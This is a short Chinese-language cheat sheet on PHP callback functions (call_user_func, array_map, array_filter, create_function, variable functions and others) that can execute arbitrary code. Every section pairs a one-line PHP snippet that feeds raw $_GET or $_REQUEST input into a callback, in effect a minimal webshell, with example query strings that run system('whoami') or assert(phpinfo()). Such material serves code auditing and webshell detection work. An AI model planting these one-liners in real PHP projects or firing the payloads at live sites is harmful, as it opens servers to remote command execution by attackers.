# PHP回调函数

---

## call_user_func

call_user_func — 把第一个参数作为回调函数调用, 其余参数是回调函数的参数

```php
<?php
    call_user_func($_GET['a1'],$_GET['a2']);
?>
//xxx.php?a1=system&a2=whoami  //命令执行
//xxx.php?a1=assert&a2=phpinfo()   //代码执行
```

## call_user_func_array()

call_user_func_array() 把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入
```php
<?php
    call_user_func_array($_GET['a1'],$_GET['a2']);
?>
//xxx.php?a1=system&a2[]=whoami
//xxx.php?a1=assert&a2[]=phpinfo()
```

## create_function()

创建匿名函数（Anonymous functions），允许 临时创建一个没有指定名称的函数。最经常用作回调函数（callback）参数的值
```php
<?php
    $b=create_function('', @$_REQUEST['a']);$b();
?>
//xxx.php?a=phpinfo();
```

## array_walk()

array_walk — 使用用户自定义函数对数组中的每个元素做回调处理
```php
<?php
    array_walk($_GET['a'],$_GET['b']);
?>
//xxx.php?a[]=whoami&b=system
//xxx.php?a[]=phpinfo()&b=assert
```

## array_map()

array_map()为数组的每个元素应用回调函数。返回数组，是为 array1 每个元素应用 callback函数之后的数组。callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。
```php
<?php
    array_map($_GET['a'],$_GET['b']);
?>
//xxx.php?a=system&b[]=whoami
//xxx.php?a=assert&b[]=phpinfo()
```

## array_filter()

array_filter()用回调函数过滤数组中的单元。依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true， 则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。
```php
<?php
    array_filter(array($_GET['cmd']),$_GET['func']);
?>
//?func=system&cmd=whoami
//?func=assert&cmd=phpinfo()
```

## 可变函数$var(args)

PHP 支持可变函数的概念。如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数， 并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。
```php
<?php
    $_GET['a']($_GET['b']);
?>
//xxx.php?a=system&b=whoami
//xxx?a=assert&b=phpinfo()
```
